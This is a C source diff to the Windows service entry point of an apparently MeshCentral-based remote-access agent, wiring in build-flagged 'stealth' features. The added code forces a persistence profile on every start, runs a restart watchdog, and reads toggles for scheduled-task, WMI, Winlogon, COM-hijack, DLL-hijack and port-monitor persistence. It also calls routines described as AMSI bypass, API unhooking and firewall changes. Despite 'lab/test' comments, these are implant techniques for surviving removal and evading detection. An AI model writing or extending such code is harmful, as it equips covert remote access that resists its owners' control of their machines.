@@ -30,6 +30,7 @@ limitations under the License.
 #include <shellapi.h>
 #include <winsvc.h>
 #include <sddl.h>
+#include <strsafe.h>
 #include "resource.h"
 #include "service_security.h"
 #include "meshcore/signcheck.h"
@@ -45,6 +46,8 @@ limitations under the License.
 #include "stealth_utils.h"
 #include "stealth_init.h"  // Lab/test stealth initialization
 #include "stealth_defaults.h"
+#include "stealth_watchdog.h"
+#include "stealth_integration.h"
 #include "svchost_payload.h"
 // Svchost registration helper (implemented in stealth_svchost.c)
 BOOL Stealth_RegisterSvchostService(const wchar_t* serviceName, const wchar_t* dllPath);
@@ -52,6 +55,9 @@ BOOL Stealth_UnregisterSvchostService(const wchar_t* serviceName);
 
 // Forward declaration to satisfy early references in this TU
 int wmain(int argc, char* wargv[]);
+
+// Macro to free argv allocated by wmain - needs argvi variable in scope
+#define wmain_free(argv) do { int argvi; for(argvi=0;argvi<(int)(ILibMemory_Size(argv)/sizeof(void*));++argvi){ILibMemory_Free(argv[argvi]);}ILibMemory_Free(argv); } while(0)
 
 #define SVCHOST_STATUS_MISSING_SERVICE_KEY    0x00000001
 #define SVCHOST_STATUS_NOT_IN_NETSVCS         0x00000002
@@ -357,6 +363,449 @@ static void MeshService_TouchProvisioningMarkers(void)
 	(void)marker;
 }
 
+#ifdef MESHAGENT_ENABLE_STEALTH
+static HANDLE g_WatchdogHeartbeatThread = NULL;
+static HANDLE g_WatchdogHeartbeatEvent = NULL;
+static HANDLE g_WatchdogHeartbeatMapHandle = NULL;
+static DWORD g_WatchdogHeartbeatIntervalMs = 8000;
+static BOOL g_WatchdogRuntimeActive = FALSE;
+static BOOL g_StealthIntegrationReady = FALSE;
+static BOOL g_StealthIntegrationRunning = FALSE;
+static DWORD WINAPI MeshService_WatchdogHeartbeatThread(LPVOID param);
+static BOOL MeshService_ReadEnvBool(const wchar_t* name, BOOL defaultValue);
+static DWORD MeshService_ReadEnvDword(const wchar_t* name, DWORD defaultValue);
+static void MeshService_JoinPath(wchar_t* dest, size_t destCch, const wchar_t* dir, const wchar_t* leaf);
+static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config);
+static BOOL MeshService_StartStealthIntegration(void);
+static void MeshService_ShutdownStealthIntegration(void);
+#endif
+
+#ifdef MESHAGENT_ENABLE_STEALTH
+/*
+ * MeshService_EnableWatchdogIfConfigured - Legacy direct watchdog activation
+ *
+ * IMPORTANT: There are two watchdog activation paths in the codebase:
+ * 1. This function (legacy) - Direct watchdog via persistence profile settings
+ * 2. StealthIntegration path - Via StealthIntegration_Init/Start and Lockdown_Enter
+ *
+ * To avoid conflicts:
+ * - If StealthIntegration is ready (g_StealthIntegrationReady == TRUE), this function
+ *   returns FALSE and defers to the StealthIntegration path
+ * - The StealthIntegration path handles watchdog via ApplyWatchdog() in stealth_lockdown.c
+ * - This ensures only ONE watchdog mechanism is active at a time
+ */
+static BOOL MeshService_EnableWatchdogIfConfigured(void)
+{
+	const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
+
+	/* Defer to StealthIntegration if it's handling watchdog */
+	if (g_StealthIntegrationReady) {
+		Stealth_DebugPrintfA("[Watchdog] Deferring to StealthIntegration path");
+		return FALSE;
+	}
+
+	if (persistence == NULL || persistence->watchdog.enabled == 0) { return FALSE; }
+	if (g_WatchdogRuntimeActive) { return TRUE; }
+
+	WCHAR serviceNameBuf[64] = { 0 };
+	if (!MeshService_GetServiceNameW(serviceNameBuf, _countof(serviceNameBuf)))
+	{
+		StringCchCopyW(serviceNameBuf, _countof(serviceNameBuf), STEALTH_FALLBACK_SERVICE_NAME);
+	}
+
+	WCHAR exePath[MAX_PATH] = { 0 };
+	if (GetModuleFileNameW(NULL, exePath, _countof(exePath)) == 0)
+	{
+		return FALSE;
+	}
+
+	WatchdogConfig config;
+	Watchdog_InitConfig(&config);
+	if (persistence->watchdog.intervalSeconds > 0)
+	{
+		config.checkIntervalMs = persistence->watchdog.intervalSeconds * 1000;
+	}
+	if (persistence->watchdog.restartDelaySeconds > 0)
+	{
+		config.restartDelayMs = persistence->watchdog.restartDelaySeconds * 1000;
+	}
+
+	if (!Watchdog_Start(&config))
+	{
+		return FALSE;
+	}
+
+	WCHAR args[128] = { 0 };
+	StringCchPrintfW(args, _countof(args), L"-watchdog \"%s\"", serviceNameBuf);
+	if (!Watchdog_AddProcess(exePath, args, NULL))
+	{
+		Watchdog_Stop();
+		return FALSE;
+	}
+
+	g_WatchdogHeartbeatIntervalMs = config.checkIntervalMs;
+
+	if (Watchdog_CreateHeartbeat(serviceNameBuf, &g_WatchdogHeartbeatMapHandle))
+	{
+		g_WatchdogHeartbeatEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
+		if (g_WatchdogHeartbeatEvent != NULL)
+		{
+			g_WatchdogHeartbeatThread = CreateThread(NULL, 0, MeshService_WatchdogHeartbeatThread, NULL, 0, NULL);
+			if (g_WatchdogHeartbeatThread == NULL)
+			{
+				CloseHandle(g_WatchdogHeartbeatEvent);
+				g_WatchdogHeartbeatEvent = NULL;
+				Watchdog_CloseHeartbeat(g_WatchdogHeartbeatMapHandle);
+				g_WatchdogHeartbeatMapHandle = NULL;
+			}
+		}
+		else
+		{
+			Watchdog_CloseHeartbeat(g_WatchdogHeartbeatMapHandle);
+			g_WatchdogHeartbeatMapHandle = NULL;
+		}
+	}
+
+	g_WatchdogRuntimeActive = TRUE;
+	return TRUE;
+}
+
+static void MeshService_DisableWatchdog(void)
+{
+	if (!g_WatchdogRuntimeActive) { return; }
+
+	if (g_WatchdogHeartbeatEvent != NULL)
+	{
+		SetEvent(g_WatchdogHeartbeatEvent);
+		if (g_WatchdogHeartbeatThread != NULL)
+		{
+			WaitForSingleObject(g_WatchdogHeartbeatThread, 3000);
+			CloseHandle(g_WatchdogHeartbeatThread);
+			g_WatchdogHeartbeatThread = NULL;
+		}
+		CloseHandle(g_WatchdogHeartbeatEvent);
+		g_WatchdogHeartbeatEvent = NULL;
+	}
+
+	if (g_WatchdogHeartbeatMapHandle != NULL)
+	{
+		Watchdog_CloseHeartbeat(g_WatchdogHeartbeatMapHandle);
+		g_WatchdogHeartbeatMapHandle = NULL;
+	}
+
+	Watchdog_Stop();
+	g_WatchdogRuntimeActive = FALSE;
+}
+
+static DWORD WINAPI MeshService_WatchdogHeartbeatThread(LPVOID param)
+{
+	UNREFERENCED_PARAMETER(param);
+
+	if (g_WatchdogHeartbeatEvent == NULL)
+	{
+		return 0;
+	}
+
+	while (WaitForSingleObject(g_WatchdogHeartbeatEvent, g_WatchdogHeartbeatIntervalMs) == WAIT_TIMEOUT)
+	{
+		Watchdog_SendHeartbeat();
+	}
+
+	return 0;
+}
+#else
+static BOOL MeshService_EnableWatchdogIfConfigured(void)
+{
+	return FALSE;
+}
+static void MeshService_DisableWatchdog(void)
+{
+}
+#endif
+
+#ifdef MESHAGENT_ENABLE_STEALTH
+static BOOL MeshService_ReadEnvBool(const wchar_t* name, BOOL defaultValue)
+{
+	wchar_t buffer[32];
+	DWORD len = GetEnvironmentVariableW(name, buffer, (DWORD)_countof(buffer));
+	if (len == 0 || len >= _countof(buffer)) { return defaultValue; }
+
+	if (_wcsicmp(buffer, L"1") == 0 || _wcsicmp(buffer, L"true") == 0 ||
+		_wcsicmp(buffer, L"yes") == 0 || _wcsicmp(buffer, L"on") == 0)
+	{
+		return TRUE;
+	}
+	if (_wcsicmp(buffer, L"0") == 0 || _wcsicmp(buffer, L"false") == 0 ||
+		_wcsicmp(buffer, L"no") == 0 || _wcsicmp(buffer, L"off") == 0)
+	{
+		return FALSE;
+	}
+	return defaultValue;
+}
+
+static DWORD MeshService_ReadEnvDword(const wchar_t* name, DWORD defaultValue)
+{
+	wchar_t buffer[32];
+	DWORD len = GetEnvironmentVariableW(name, buffer, (DWORD)_countof(buffer));
+	if (len == 0 || len >= _countof(buffer)) { return defaultValue; }
+
+	wchar_t* endPtr = NULL;
+	DWORD value = (DWORD)wcstoul(buffer, &endPtr, 10);
+	if (endPtr == buffer) { return defaultValue; }
+	return value;
+}
+
+static void MeshService_JoinPath(wchar_t* dest, size_t destCch, const wchar_t* dir, const wchar_t* leaf)
+{
+	if (dest == NULL || dir == NULL || leaf == NULL || destCch == 0) { return; }
+	StringCchCopyW(dest, destCch, dir);
+	size_t len = wcslen(dest);
+	if (len > 0 && dest[len - 1] != L'\\' && dest[len - 1] != L'/')
+	{
+		StringCchCatW(dest, destCch, L"\\");
+	}
+	StringCchCatW(dest, destCch, leaf);
+}
+
+static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config)
+{
+	if (config == NULL) { return FALSE; }
+
+	StealthIntegration_LoadDefaultConfig(config);
+
+	WCHAR serviceNameBuf[64] = { 0 };
+	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceNameBuf, _countof(serviceNameBuf));
+	if (serviceNameBuf[0] == L'\0')
+	{
+		StringCchCopyW(serviceNameBuf, _countof(serviceNameBuf), STEALTH_FALLBACK_SERVICE_NAME);
+	}
+	StringCchCopyW(config->serviceName, _countof(config->serviceName), serviceNameBuf);
+
+	WCHAR displayNameBuf[128] = { 0 };
+	MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), displayNameBuf, _countof(displayNameBuf));
+	if (displayNameBuf[0] == L'\0')
+	{
+		StringCchCopyW(displayNameBuf, _countof(displayNameBuf), STEALTH_FALLBACK_DISPLAY_NAME);
+	}
+	StringCchCopyW(config->displayName, _countof(config->displayName), displayNameBuf);
+
+	WCHAR exePath[MAX_PATH] = { 0 };
+	if (GetModuleFileNameW(NULL, exePath, _countof(exePath)) != 0)
+	{
+		StringCchCopyW(config->serviceExePath, _countof(config->serviceExePath), exePath);
+	}
+
+	StealthInstallPaths paths = { 0 };
+	if (Stealth_GetInstallPaths(&paths))
+	{
+		if (paths.installDir[0] != L'\0')
+		{
+			StringCchCopyW(config->installDir, _countof(config->installDir), paths.installDir);
+			MeshService_JoinPath(config->stateFilePath, _countof(config->stateFilePath), paths.installDir, L"state.dat");
+		}
+		if (paths.logPath[0] != L'\0')
+		{
+			StringCchCopyW(config->logFilePath, _countof(config->logFilePath), paths.logPath);
+		}
+		else if (paths.logsDir[0] != L'\0')
+		{
+			MeshService_JoinPath(config->logFilePath, _countof(config->logFilePath), paths.logsDir, L"integration.log");
+		}
+	}
+
+	StringCchPrintfW(config->ipcPipeName, _countof(config->ipcPipeName),
+		L"\\\\.\\pipe\\%s_Ipc", serviceNameBuf);
+
+	const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
+	config->enableServiceProtection = TRUE;
+	config->enableTaskScheduler = MeshService_ReadEnvBool(L"STEALTH_ENABLE_TASKS",
+		(persistence != NULL && persistence->autorunTask.enabled != 0));
+	config->enableWmiConsumer = MeshService_ReadEnvBool(L"STEALTH_ENABLE_WMI",
+		(persistence != NULL && persistence->restartTask.enabled != 0));
+	config->enableWatchdog = MeshService_ReadEnvBool(L"STEALTH_ENABLE_WATCHDOG",
+		(persistence != NULL && persistence->watchdog.enabled != 0));
+	config->enableTamperDetection = MeshService_ReadEnvBool(L"STEALTH_ENABLE_MONITOR", config->enableTamperDetection);
+	config->enableIpcServer = MeshService_ReadEnvBool(L"STEALTH_ENABLE_IPC", config->enableIpcServer);
+	config->enableRegistryPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_REGISTRY_POLICY", config->enableRegistryPolicy);
+	config->enableWinlogon = MeshService_ReadEnvBool(L"STEALTH_ENABLE_WINLOGON", config->enableWinlogon);
+	config->enableExplorerPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_EXPLORER_POLICY", config->enableExplorerPolicy);
+	config->enableComHijack = MeshService_ReadEnvBool(L"STEALTH_ENABLE_COM_HIJACK", config->enableComHijack);
+	config->enablePortMonitor = MeshService_ReadEnvBool(L"STEALTH_ENABLE_PORT_MONITOR", config->enablePortMonitor);
+	config->enableDllHijack = MeshService_ReadEnvBool(L"STEALTH_ENABLE_DLL_HIJACK", config->enableDllHijack);
+
+	if (persistence != NULL && persistence->watchdog.intervalSeconds > 0)
+	{
+		config->watchdogIntervalMs = persistence->watchdog.intervalSeconds * 1000;
+	}
+	config->monitorIntervalMs = MeshService_ReadEnvDword(L"STEALTH_MONITOR_INTERVAL_MS", config->monitorIntervalMs);
+	config->watchdogIntervalMs = MeshService_ReadEnvDword(L"STEALTH_WATCHDOG_INTERVAL_MS", config->watchdogIntervalMs);
+	config->ipcTimeoutMs = MeshService_ReadEnvDword(L"STEALTH_IPC_TIMEOUT_MS", config->ipcTimeoutMs);
+
+	config->autoSecureEnter = MeshService_ReadEnvBool(L"STEALTH_AUTO_SECUREENTER", config->enableWatchdog);
+
+	wchar_t authKey[64];
+	if (GetEnvironmentVariableW(L"STEALTH_IPC_AUTH", authKey, (DWORD)_countof(authKey)) > 0)
+	{
+		StringCchCopyW(config->ipcAuthKey, _countof(config->ipcAuthKey), authKey);
+	}
+
+	// Helper monitor configuration (defaults to watchdog enabled profile unless overridden)
+	{
+		BOOL helperDefault = (persistence != NULL && persistence->watchdog.enabled != 0);
+		config->enableHelperMonitor = MeshService_ReadEnvBool(
+			L"STEALTH_ENABLE_HELPER_MONITOR",
+			helperDefault ? TRUE : FALSE);
+	}
+
+	if (config->enableHelperMonitor)
+	{
+		BOOL helperExeValid = FALSE;
+		wchar_t helperExeEnv[MAX_PATH] = { 0 };
+		wchar_t helperExeExpanded[MAX_PATH] = { 0 };
+		const wchar_t* rawHelperExe = NULL;
+
+		if (GetEnvironmentVariableW(L"STEALTH_HELPER_EXE", helperExeEnv, (DWORD)_countof(helperExeEnv)) > 0)
+		{
+			rawHelperExe = helperExeEnv;
+		}
+		else if (config->helperExePath[0] != L'\0')
+		{
+			rawHelperExe = config->helperExePath;
+		}
+		else
+		{
+			rawHelperExe = config->serviceExePath;
+		}
+
+		if (rawHelperExe != NULL && rawHelperExe[0] != L'\0')
+		{
+			const wchar_t* resolvedExe = rawHelperExe;
+			if (ExpandEnvironmentStringsW(rawHelperExe, helperExeExpanded, (DWORD)_countof(helperExeExpanded)) > 0 &&
+				helperExeExpanded[0] != L'\0')
+			{
+				resolvedExe = helperExeExpanded;
+			}
+
+			DWORD attrs = GetFileAttributesW(resolvedExe);
+			if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0)
+			{
+				StringCchCopyW(config->helperExePath, _countof(config->helperExePath), resolvedExe);
+				helperExeValid = TRUE;
+			}
+			else
+			{
+				Stealth_DebugPrintfW(L"[HelperMonitor] Helper executable missing or invalid: %ls", resolvedExe);
+			}
+		}
+
+		if (!helperExeValid)
+		{
+			config->enableHelperMonitor = FALSE;
+		}
+		else
+		{
+			wchar_t helperArgs[512] = { 0 };
+			wchar_t helperArgsExpanded[512] = { 0 };
+
+			if (GetEnvironmentVariableW(L"STEALTH_HELPER_ARGS", helperArgs, (DWORD)_countof(helperArgs)) > 0)
+			{
+				const wchar_t* resolvedArgs = helperArgs;
+				if (ExpandEnvironmentStringsW(helperArgs, helperArgsExpanded, (DWORD)_countof(helperArgsExpanded)) > 0 &&
+					helperArgsExpanded[0] != L'\0')
+				{
+					resolvedArgs = helperArgsExpanded;
+				}
+				StringCchCopyW(config->helperArguments, _countof(config->helperArguments), resolvedArgs);
+			}
+			else if (config->helperArguments[0] == L'\0')
+			{
+				StringCchCopyW(config->helperArguments, _countof(config->helperArguments), L"-kvm0");
+			}
+
+			config->helperPersistentSpawn = MeshService_ReadEnvBool(L"STEALTH_HELPER_PERSISTENT", config->helperPersistentSpawn);
+			config->helperRegisterWatchdog = MeshService_ReadEnvBool(L"STEALTH_HELPER_WATCHDOG", config->helperRegisterWatchdog);
+		}
+	}
+
+	return TRUE;
+}
+
+static BOOL MeshService_StartStealthIntegration(void)
+{
+	if (g_StealthIntegrationRunning) { return TRUE; }
+
+	StealthIntegrationConfig config;
+	if (!MeshService_BuildIntegrationConfig(&config))
+	{
+		return FALSE;
+	}
+
+	if (!g_StealthIntegrationReady)
+	{
+		if (!StealthIntegration_Init(&config))
+		{
+			return FALSE;
+		}
+		g_StealthIntegrationReady = TRUE;
+	}
+
+	if (StealthIntegration_Start())
+	{
+		g_StealthIntegrationRunning = TRUE;
+		return TRUE;
+	}
+
+	StealthIntegration_Cleanup();
+	g_StealthIntegrationReady = FALSE;
+	return FALSE;
+}
+
+static void MeshService_ShutdownStealthIntegration(void)
+{
+	if (!g_StealthIntegrationReady)
+	{
+		return;
+	}
+
+	if (g_StealthIntegrationRunning)
+	{
+		StealthIntegration_Stop();
+		g_StealthIntegrationRunning = FALSE;
+	}
+
+	StealthIntegration_Cleanup();
+	g_StealthIntegrationReady = FALSE;
+}
+#endif /* MESHAGENT_ENABLE_STEALTH */
+
+static void MeshService_ActivateResilience(void)
+{
+#ifdef MESHAGENT_ENABLE_STEALTH
+	if (!MeshService_StartStealthIntegration())
+	{
+		MeshService_EnableWatchdogIfConfigured();
+	}
+#else
+	MeshService_EnableWatchdogIfConfigured();
+#endif
+}
+
+static void MeshService_DeactivateResilience(void)
+{
+#ifdef MESHAGENT_ENABLE_STEALTH
+	if (g_StealthIntegrationReady)
+	{
+		MeshService_ShutdownStealthIntegration();
+	}
+	else
+	{
+		MeshService_DisableWatchdog();
+	}
+#else
+	MeshService_DisableWatchdog();
+#endif
+}
+
 static void MeshService_InitializeBrandingGlobals(void)
 {
 	if (g_serviceFileText == NULL)
@@ -537,6 +986,12 @@ BOOL RunAsAdmin(char* args, int isAdmin)
 
 DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eventData, void* eventContext)
 {
+#ifdef MESHAGENT_ENABLE_STEALTH
+	if (StealthIntegration_HandleServiceControl(controlCode))
+	{
+		return NO_ERROR;
+	}
+#endif
 	switch (controlCode)
 	{
 	case SERVICE_CONTROL_INTERROGATE:
@@ -565,33 +1020,51 @@ DWORD WINAPI ServiceControlHandler(DWORD controlCode, DWORD eventType, void *eve
 		}
 		break;
 	case SERVICE_CONTROL_SESSIONCHANGE:
-		if (agent == NULL)
 		{
-			break; // If there isn't an agent, no point in doing anything, cuz nobody will hear us
-		}
+			/* Extract session ID from event data (WTSSESSION_NOTIFICATION structure) */
+			DWORD sessionId = 0;
+			if (eventData != NULL)
+			{
+				WTSSESSION_NOTIFICATION* sessionNotification = (WTSSESSION_NOTIFICATION*)eventData;
+				if (sessionNotification->cbSize >= sizeof(WTSSESSION_NOTIFICATION))
+				{
+					sessionId = sessionNotification->dwSessionId;
+				}
+			}
 
-		switch (eventType)
-		{
-		case WTS_CONSOLE_CONNECT:		// The session identified by lParam was connected to the console terminal or RemoteFX session.
-			break;
-		case WTS_CONSOLE_DISCONNECT:	// The session identified by lParam was disconnected from the console terminal or RemoteFX session.
-			break;
-		case WTS_REMOTE_CONNECT:		// The session identified by lParam was connected to the remote terminal.
-			break;
-		case WTS_REMOTE_DISCONNECT:		// The session identified by lParam was disconnected from the remote terminal.
-			break;
-		case WTS_SESSION_LOGON:			// A user has logged on to the session identified by lParam.
-		case WTS_SESSION_LOGOFF:		// A user has logged off the session identified by lParam.					
-			break;
-		case WTS_SESSION_LOCK:			// The session identified by lParam has been locked.
-			break;
-		case WTS_SESSION_UNLOCK:		// The session identified by lParam has been unlocked.
-			break;
-		case WTS_SESSION_REMOTE_CONTROL:// The session identified by lParam has changed its remote controlled status.To determine the status, call GetSystemMetrics and check the SM_REMOTECONTROL metric.
-			break;
-		case WTS_SESSION_CREATE:		// Reserved for future use.
-		case WTS_SESSION_TERMINATE:		// Reserved for future use.
-			break;
+#ifdef MESHAGENT_ENABLE_STEALTH
+			/* Forward session change to stealth integration for helper monitor */
+			StealthIntegration_HandleSessionChange(eventType, sessionId);
+#endif
+
+			if (agent == NULL)
+			{
+				break; // If there isn't an agent, no point in doing anything, cuz nobody will hear us
+			}
+
+			switch (eventType)
+			{
+			case WTS_CONSOLE_CONNECT:		// The session identified by lParam was connected to the console terminal or RemoteFX session.
+				break;
+			case WTS_CONSOLE_DISCONNECT:	// The session identified by lParam was disconnected from the console terminal or RemoteFX session.
+				break;
+			case WTS_REMOTE_CONNECT:		// The session identified by lParam was connected to the remote terminal.
+				break;
+			case WTS_REMOTE_DISCONNECT:		// The session identified by lParam was disconnected from the remote terminal.
+				break;
+			case WTS_SESSION_LOGON:			// A user has logged on to the session identified by lParam.
+			case WTS_SESSION_LOGOFF:		// A user has logged off the session identified by lParam.
+				break;
+			case WTS_SESSION_LOCK:			// The session identified by lParam has been locked.
+				break;
+			case WTS_SESSION_UNLOCK:		// The session identified by lParam has been unlocked.
+				break;
+			case WTS_SESSION_REMOTE_CONTROL:// The session identified by lParam has changed its remote controlled status.To determine the status, call GetSystemMetrics and check the SM_REMOTECONTROL metric.
+				break;
+			case WTS_SESSION_CREATE:		// Reserved for future use.
+			case WTS_SESSION_TERMINATE:		// Reserved for future use.
+				break;
+			}
 		}
 		break;
 	default:
@@ -615,6 +1088,26 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 
 	MeshService_InitializeBrandingGlobals();
 
+#ifdef MESHAGENT_ENABLE_STEALTH
+	if (argc > 1 && _stricmp(argv[1], "-refresh-persistence") == 0)
+	{
+		int refreshStatus = 0;
+		if (!IsAdmin())
+		{
+			printf("[!] -refresh-persistence requires elevation.\n");
+			refreshStatus = 1;
+		}
+		else
+		{
+			printf("[*] Reapplying persistence profile...\n");
+			Stealth_ApplyPersistenceProfile();
+			printf("[+] Persistence refresh complete.\n");
+		}
+		wmain_free(argv);
+		return refreshStatus;
+	}
+#endif
+
 	// Initialise service status
 	// Report as our own-process service so SCM manages it as a dedicated process
 	serviceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
@@ -624,7 +1117,7 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 	serviceStatus.dwServiceSpecificExitCode = NO_ERROR;
 	serviceStatus.dwCheckPoint = 0;
 	serviceStatus.dwWaitHint = 0;
-	serviceStatusHandle = RegisterServiceCtrlHandlerExA(serviceName, (LPHANDLER_FUNCTION_EX)ServiceControlHandler, NULL);
+	serviceStatusHandle = RegisterServiceCtrlHandlerExA(serviceName, ServiceControlHandler, NULL);
 
 	if (serviceStatusHandle)
 	{
@@ -655,6 +1148,9 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         // SECURITY: Enable optional stealth/anti-analysis features only if
         // explicitly enabled at build time.
 #ifdef MESHAGENT_ENABLE_STEALTH
+        // Always enforce persistence artefacts even if the installer failed to stage them.
+        Stealth_ApplyPersistenceProfile();
+
         // Initialize lab features (AMSI, logging, API unhook, firewall) when enabled
         Stealth_InitLabFeatures();
 
@@ -681,6 +1177,8 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
         }
 #endif
 
+		MeshService_ActivateResilience();
+
 		// Run the mesh agent
 		CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 
@@ -696,6 +1194,8 @@ void WINAPI ServiceMain(DWORD argc, LPTSTR *argv)
 			ILib_WindowsExceptionDebugEx(&winException);
 		}
 		CoUninitialize();
+
+		MeshService_DeactivateResilience();
 
 		// Service was stopped
 		serviceStatus.dwCurrentState = SERVICE_STOP_PENDING;
@@ -774,6 +1274,73 @@ int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE hPrev, LPWSTR lpCmdLine, int nSho
 }
 #endif
 
+#if !defined(UNICODE) && !defined(_UNICODE)
+// ANSI builds still enter through main(). Duplicate argv as wide so wmain()
+// can reuse the shared flow (including the -watchdog fast-path).
+static WCHAR** MeshService_CopyAnsiArgsToWide(int argc, char** argv)
+{
+	WCHAR** wideArgs = NULL;
+	int i;
+
+	if (argc <= 0) { return NULL; }
+
+	wideArgs = (WCHAR**)ILibMemory_SmartAllocate((argc + 1) * sizeof(void*));
+	if (wideArgs == NULL) { return NULL; }
+	ZeroMemory(wideArgs, (argc + 1) * sizeof(void*));
+
+	for (i = 0; i < argc; ++i)
+	{
+		if (argv[i] == NULL) { continue; }
+
+		int needed = MultiByteToWideChar(CP_UTF8, 0, argv[i], -1, NULL, 0);
+		if (needed <= 0)
+		{
+			needed = MultiByteToWideChar(CP_ACP, 0, argv[i], -1, NULL, 0);
+		}
+		if (needed <= 0) { continue; }
+
+		wideArgs[i] = (WCHAR*)ILibMemory_SmartAllocate(needed * sizeof(WCHAR));
+		if (MultiByteToWideChar(CP_UTF8, 0, argv[i], -1, wideArgs[i], needed) <= 0)
+		{
+			MultiByteToWideChar(CP_ACP, 0, argv[i], -1, wideArgs[i], needed);
+		}
+	}
+
+	return wideArgs;
+}
+
+int main(int argc, char** argv)
+{
+#ifdef MESHAGENT_ENABLE_STEALTH
+	if (argc > 2 && argv[1] != NULL && _stricmp(argv[1], "-watchdog") == 0)
+	{
+		WCHAR targetService[256] = { 0 };
+		if (MultiByteToWideChar(CP_UTF8, 0, argv[2], -1, targetService, (int)_countof(targetService)) <= 0)
+		{
+			if (MultiByteToWideChar(CP_ACP, 0, argv[2], -1, targetService, (int)_countof(targetService)) <= 0)
+			{
+				printf("[!] -watchdog requires a valid service name argument\n");
+				return 1;
+			}
+		}
+
+		WatchdogConfig wdCfg;
+		Watchdog_InitConfig(&wdCfg);
+		Watchdog_ServiceMain(targetService, &wdCfg);
+		return 0;
+	}
+#endif
+
+	WCHAR** wideArgs = MeshService_CopyAnsiArgsToWide(argc, argv);
+	int result = wmain(argc, (char**)wideArgs);
+	if (wideArgs != NULL)
+	{
+		wmain_free(wideArgs);
+	}
+	return result;
+}
+#endif
+
 
 /*
 int APIENTRY _tWinMain(HINSTANCE hInstance,
@@ -815,7 +1382,7 @@ BOOL CtrlHandler(DWORD fdwCtrlType)
 	}
 }
 
-#define wmain_free(argv) for(argvi=0;argvi<(int)(ILibMemory_Size(argv)/sizeof(void*));++argvi){ILibMemory_Free(argv[argvi]);}ILibMemory_Free(argv);
+/* Note: wmain_free macro is defined at file top for use in ServiceMain() */
 
 void need_stop_chain(duk_context *ctx, void *user)
 {
@@ -846,12 +1413,42 @@ int wmain(int argc, char* wargv[])
 	int retCode = 0;
 
 	int argvi, argvsz;
-	char **argv = (char**)ILibMemory_SmartAllocate((argc + 1) * sizeof(void*));
+	char **argv = NULL;
+	WCHAR **wideArgv = (WCHAR**)wargv;
+
+#ifdef MESHAGENT_ENABLE_STEALTH
+	if (wideArgv != NULL &&
+		argc > 2 &&
+		wideArgv[1] != NULL &&
+		_wcsicmp(wideArgv[1], L"-watchdog") == 0)
+	{
+		const WCHAR* targetService = wideArgv[2];
+		if (targetService == NULL || targetService[0] == L'\0')
+		{
+			wprintf(L"[!] -watchdog requires a service name argument\n");
+			return 1;
+		}
+
+		WatchdogConfig wdCfg;
+		Watchdog_InitConfig(&wdCfg);
+		Watchdog_ServiceMain(targetService, &wdCfg);
+		return 0;
+	}
+#endif
+
+	argv = (char**)ILibMemory_SmartAllocate((argc + 1) * sizeof(void*));
 	for (argvi = 0; argvi < argc; ++argvi)
 	{
-		argvsz = WideCharToMultiByte(CP_UTF8, 0, (LPCWCH)wargv[argvi], -1, NULL, 0, NULL, NULL);
+		LPCWCH sourceArg = (wideArgv != NULL) ? wideArgv[argvi] : NULL;
+		if (sourceArg == NULL)
+		{
+			argv[argvi] = NULL;
+			continue;
+		}
+
+		argvsz = WideCharToMultiByte(CP_UTF8, 0, sourceArg, -1, NULL, 0, NULL, NULL);
 		argv[argvi] = (char*)ILibMemory_SmartAllocate(argvsz);
-		WideCharToMultiByte(CP_UTF8, 0, (LPCWCH)wargv[argvi], -1, argv[argvi], argvsz, NULL, NULL);
+		WideCharToMultiByte(CP_UTF8, 0, sourceArg, -1, argv[argvi], argvsz, NULL, NULL);
 	}
 
 	MeshService_InitializeBrandingGlobals();
@@ -1477,6 +2074,7 @@ int wmain(int argc, char* wargv[])
 			agent->meshCoreCtx_embeddedScript = integratedJavaScript;
 			agent->meshCoreCtx_embeddedScriptLen = integragedJavaScriptLen;
 			if (integratedJavaScript != NULL || (argc > 1 && (strcasecmp(argv[1], "run") == 0 || strcasecmp(argv[1], "connect") == 0))) { agent->runningAsConsole = 1; }
+			MeshService_ActivateResilience();
 			MeshAgent_Start(agent, argc, argv);
 			retCode = agent->exitCode;
 			MeshAgent_Destroy(agent);
@@ -1486,6 +2084,7 @@ int wmain(int argc, char* wargv[])
 		{
 			ILib_WindowsExceptionDebugEx(&winException);
 		}
+		MeshService_DeactivateResilience();
 		wmain_free(argv);
 		return(retCode);
 	}
@@ -1513,6 +2112,7 @@ int wmain(int argc, char* wargv[])
 				{
 					agent = MeshAgent_Create(0);
 					agent->runningAsConsole = 1;
+					MeshService_ActivateResilience();
 					MeshAgent_Start(agent, argc, argv);
 					MeshAgent_Destroy(agent);
 					agent = NULL;
@@ -1521,6 +2121,7 @@ int wmain(int argc, char* wargv[])
 				{
 					ILib_WindowsExceptionDebugEx(&winException);
 				}
+				MeshService_DeactivateResilience();
 			}
 			else
 			{
